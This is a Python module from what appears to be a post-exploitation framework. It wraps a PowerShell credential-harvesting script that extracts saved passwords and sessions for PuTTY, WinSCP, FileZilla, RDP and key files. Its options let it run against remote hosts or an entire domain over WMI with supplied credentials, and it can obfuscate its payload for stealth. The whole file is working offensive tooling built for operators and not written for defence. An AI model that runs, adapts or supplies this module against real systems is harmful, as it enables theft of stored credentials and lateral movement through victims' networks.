from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Invoke-SessionGopher',

            # List of one or more authors for the module
            'Author': ['@arvanaghi, created at FireEye'],

            # More verbose multi-line description of the module
            'Description': ('Extract saved sessions & passwords for WinSCP, PuTTY, SuperPuTTY, FileZilla, '
                            'RDP, .ppk files, .rdp files, .sdtid files'),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': None,

            # True if the module needs admin rights to run
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # The language for this module
            'Language': 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion': '2',

            # list of any references/other comments
            'Comments': [
            		'Twitter: @arvanaghi | ',
            		'https://arvanaghi.com | ',
                'https://github.com/fireeye/SessionGopher',
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Thorough' : {
                'Description'   :   'Switch. Searches entire filesystem for .ppk, .rdp, .sdtid files. Not recommended to use with -AllDomain due to time.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'u' : {
                'Description'   :   'User account (e.g. corp.com\jerry) for when using -Target, -iL, or -AllDomain. If not provided, uses current security context.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'p' : {
                'Description'   :   'Password for user account (if -u argument provided).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Target' : {
                'Description'   :   'Provide a single host to run remotely against. Uses WMI.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'o' : {
                'Description'   :   'Switch. Drops a folder of all output in .csvs on remote host.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'AllDomain' : {
                'Description'   :   'Switch. Run against all computers on domain. Uses current security context, unless -u and -p arguments provided. Uses WMI.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'iL' : {
                'Description'   :   'Provide path to a .txt file on the remote host containing hosts separated by newlines to run remotely against. Uses WMI.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # if you're reading in a large, external script that might be updates,
        #   use the pattern below
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-SessionGopher.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = "Invoke-SessionGopher"

        # add any arguments to the end execution of the script
        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
